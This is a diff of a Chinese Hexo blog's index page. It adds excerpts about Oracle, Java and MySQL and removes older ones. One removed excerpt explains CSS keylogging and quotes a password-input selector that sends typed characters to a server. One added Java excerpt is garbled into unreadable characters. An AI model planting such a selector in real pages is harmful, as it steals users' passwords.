@@ -136,6 +136,126 @@
     
     
     <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/03/12/%E5%AD%97%E7%AC%A6%E9%9B%86%E7%9B%B8%E5%85%B3/">
+        <p class="h4 index-header">字符集相关</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">oracle的编码格式涉及三方面的字符集，
+oracel server端的字符集; 
+oracle client端的字符集; 
+dmp文件的字符集。
+
+为避免出现乱码需要将以上字符集统一。
+服务端字符集查看方法select userenv(&#39;language&#39;) from dual;客户端字符集查看方法Linux：
+echo $NLS_LANGwin：
+查看环境变量
+NLS_LANG：AMERICAN_AMERICA.AL32UTF8
+Linux：
+查看环境变量
+echo $NLS_LANG
+dmp文件查看方法select nls_charset_name(to_number(‘0354’,’xxxx’)) from dual;
+为ZHS16GBK则支持中文
+select nls_charset_name(to_number(‘0369’,’xxxx’)) from dual; 
+为AL32UTF8则支持中文
+如果dmp文件很大，比如有2G以上(这也是最常见的情况)，用文本编辑器打开很慢或者完全打不开，可以用以下命令(在unix主机上): 
+cat exp.dmp |o</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-12&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/03/12/oracle%E4%BB%8B%E7%BB%8D%E5%8F%8A%E8%A7%A3%E9%94%81scott%E7%94%A8%E6%88%B7/">
+        <p class="h4 index-header">oracle介绍及解锁scott用户</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">1，收费标准​    软件完全开放下载，安装和使用不做任何限制。但是你要是企业用，就得购买授权，如果被别人举报，让oracle公司查到的话就会起诉罚钱的。​    普通版本，一个cup一年3.5万，买断18万，服务费18*22%；
+2，安装好oracle后需要的服务​    1，OracleOraDb10g_home1TNSListener:Oracle服务器监听器，用于监听客户端的连接请求。该服务在使用Oracle时必须开启，否则无法连接Oracle数据库。​    2，OracleServiceORCL:Oracle数据库服务。正常使用Oracle数据库时必须开启​    3，OracleOraDb10g_home1iSQL*Plus：Oracle的网页版查询分析器的服务器端，查询分析器的URL在安装结束时的最后一个界面中已经给出。​    4，OracleDBConsoleorcl:Oracle的企业管理器(EM)的服务器端，EM的访问地址在安装结束时的最后一个界面中已经给出，需要从浏览器中键入EM的URL地址来访问，一般由DBA使用，用于监测和管理Oracle服务器的运行状态。</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-12&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/03/12/java%E7%BB%83%E4%B9%A0%E9%A2%98/">
+        <p class="h4 index-header">java练习题</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">ʲô��JDK��:Java���Կ������߰�ʲô��JRE��:JAVA�����л���ʲôJVM��:JAVA���������MVC���ģʽ��: ģ�� ��ͼ ��������Ŀ���������淶��:�շ������� ÿһ����������ĸ��д�����������淶��:com.��˾��.��Ŀ��.ģ���������������淶��: �շ�ʽ������ÿ����������ĸ��д�������������淶��:�ӵڶ������ʿ�ʼ������ĸ��д�������������淶��: ���»��ߡ���ĸ����Ԫ����ͷ,������»��ߡ���ĸ����Ԫ���Լ�������û�г������ƣ��Դ�Сд������ô����������:new ���췽����������ô�������췽����:public+�����������б���{}һ���࣬����ô��������»��Զ�����һ���޲ι��췽����:û���޲ι��췽����ʱ��ʲô�Ƿ�����������:һ�����У������</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-12&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
+      <a href="/2020/03/11/mysql50%E9%81%93%E7%BB%8F%E5%85%B8%E9%A2%98/">
+        <p class="h4 index-header">mysql50道经典题</p>
+        
+        
+          
+        
+        <div class="index-excerpt" >
+          <div class="index-text mb-1">1,用一条SQL语句,查询出每门课都大于80分的学生姓名name   kecheng   fenshu张三     语文       81张三     数学       75李四     语文       76李四     数学       90王五     语文       81王五     数学       100王五     英语       90
+SELECT NAME,KECHENG,SCORE FROM STUDENT_1 WHERE SCORE &gt;80;2,所有部门之间的比赛组合一个叫department的表，里面只有一个字段name,一共有4条纪录，分别是a,b,c,d,对应四个球对，现在四个球对进行比赛，用一条sql语句显示所有可能的比赛组合.答:SELECT a.name,b.nameFROM(SELECT name from DEPARTMENT_2) a,(SELECT name from DEPARTMENT_2) bwhere a.name&lt;b.name;3,统计每年每月的信息year  month amount1991   1     1.11</div>
+        </div>
+      </a>
+
+      <div>
+        
+          <i class="iconfont icon-riqi2"></i>&nbsp;2020-03-11&nbsp;&nbsp;
+        
+        
+        
+      </div>
+    </div>
+  </div>
+
+  <div class="row mb-4 mx-auto">
+    
+    
+    <div class="col-12 col-md-8 m-auto">
       <a href="/2020/03/03/centos%E5%AE%89%E8%A3%85oracle/">
         <p class="h4 index-header">centos安装oracle</p>
         
@@ -368,211 +488,11 @@ $ npm -v
     </div>
   </div>
 
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/02/%E4%BD%BF%E7%94%A8Css%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81/">
-        <p class="h4 index-header">使用Css获取用户密码</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">不一样的 css说到 css，大多数人的第一印象基本上就是用来配置界面样式的，甚至于连语言都称不上，但随着 web 技术的不停发展，其所具有的能力也与日俱新，不再是当初那个仅仅满足最基本布局需求的层叠样式表了，至于新的属性新的功能点笔者也了解不全，在这里也不便展开了。
-话题回到不一样的 css 上，github 上 jbtronics 给出了这样一份答案 CrookedStyleSheets，在这里笔者直接给上该项目的中文文档，该文档上有一段关于输入监测的段落，请详细阅读完，如果早已看过请跳过继续看本文的后续部分。
-css 监听键盘记录CSS-Keylogging 项目使用 css 监听键盘记录的方式一致，基本上是通过 css 选择器去实现功能，CSS-Keylogging 更为巧妙的使用多重选择器去捕获相应的按键事件。
-核心代码如下:
-input[type=&quot;password&quot;][value$=&quot;1&quot;] { background-image: url(&quot;http://localhost:3000/1&quot;); }解释如下：
-当 </div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-02&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/01/%E5%85%B3%E4%BA%8EjQuery%E4%B8%AD%E2%80%9Canimate-%E2%80%9D%E5%87%BD%E6%95%B0%E5%AF%B9%E9%A2%9C%E8%89%B2%E5%8F%98%E5%8C%96%E7%9A%84%E6%94%AF%E6%8C%81/">
-        <p class="h4 index-header">关于jQuery中“animate()”函数对颜色变化的支持</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">我要做得就是让下面一段代码生效：
-$(&quot;#yourid&quot;).stop().animate({ &quot;backgroundColor&quot; : &quot;#rrggbb&quot;, &quot;color&quot; : &quot;#rrggbb&quot; }, &quot;fast&quot;);
-　　但是，很遗憾，一点也没有动。本来效果应该跟这个版本的xcoder博客的天头导航条一样有个动态效果（只不过xcoder的导航条是透明度变化，而项目中我想让它背景色变化）。
-　　原因是什么呢？死月上网查了很久，找到的东西都很简单地说明了一下，貌似都可以。嘛，也许是jQuery新版本不支持这个特性了吧。
-　　最后，死月在jQuery的官方文档中找到了下面这段话——
-
-All animated properties should be animated to a single numeric value\, except as noted below; most properties that are non-numeric cannot be anima</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-01&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/01/hexo%E5%8D%9A%E5%AE%A2%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E5%8F%8A%E7%94%A8%E6%B3%95/">
-        <p class="h4 index-header">hexo博客常用插件及用法</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">hexo-autonofollowGithub：https://github.com/liuzc/hexo-autonofollow
-简介：自动为站外链接添加nofollow属性
-安装：
-$ npm install hexo-autonofollow --save配置：
-在博客配置文件_config.yml中添加
-nofollow:  enable: true  exclude:    - exclude1.com    - exclude2.com
-enable - 是否启用
-exclude - 排除域名
-
-hexo-baidu-url-submitGithub：https://github.com/huiwang/hexo-baidu-url-submit
-简介：主动推送Hexo博客新链接至百度搜索引擎，解决百度爬虫被禁止访问的问题，提升网站收录质量和速度。
-安装：
-$ npm install hexo-baidu-url-submit --save配置：
-在博客配置文件_config.yml中添加
-baidu_url_submit:  count: 1 ## 提交最新的一个链接 </div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-01&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
-  <div class="row mb-4 mx-auto">
-    
-    
-    <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/01/%E9%9D%A2%E8%AF%95%E8%A6%81%E7%82%B9%E6%95%B4%E7%90%86/">
-        <p class="h4 index-header">面试要点整理</p>
-        
-        
-          
-        
-        <div class="index-excerpt" >
-          <div class="index-text mb-1">
-http相关
-https
-http2.0
-http三次握手和四次挥手
-三次握手
-四次挥手
-
-
-常见的http头
-请求头：
-响应头
-
-
-常见的http代码
-http方法
-浏览器输入url到最终显示过程
-get请求和post请求的区别
-服务器主动推送
-
-
-ajax相关
-ajax的优点
-ajax的缺点
-xml和json的比较
-js解析json的方法
-xmlhttprequest的readystate取值
-
-
-web安全相关
-csrf
-xss
-clickjacking
-
-
-性能优化
-内容优化
-服务器优化
-js优化
-css优化
-图片优化
-
-
-vue相关
-mvvm和mvc
-vue双向数据绑定
-vue生命周期
-vue组件通信
-vuex的作用
-vue1.0和vue2.0的区别是什么
-
-
-js相关
-数据类型
-判断数据类型
-高级函数
-惰性载入函数
-安全的类型检测
-作用域安全的构造函数
-函数柯里化
-
-
-判断数组
-箭头函数和this
-this指向
-作用域
-词法分析
-构造函数
-new的操作
-promise和async/await
-闭包
-js对象私有变量
-js垃圾回收机制
-原型链
-rhs和lhs
-EventLo</div>
-        </div>
-      </a>
-
-      <div>
-        
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-01&nbsp;&nbsp;
-        
-        
-        
-      </div>
-    </div>
-  </div>
-
 
 
   <nav aria-label="index posts navigation">
     <span class="pagination pg-blue justify-content-center mt-5" id="pagination">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-double-right"></i></a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fas fa-angle-double-right"></i></a>
     </span>
   </nav>
   
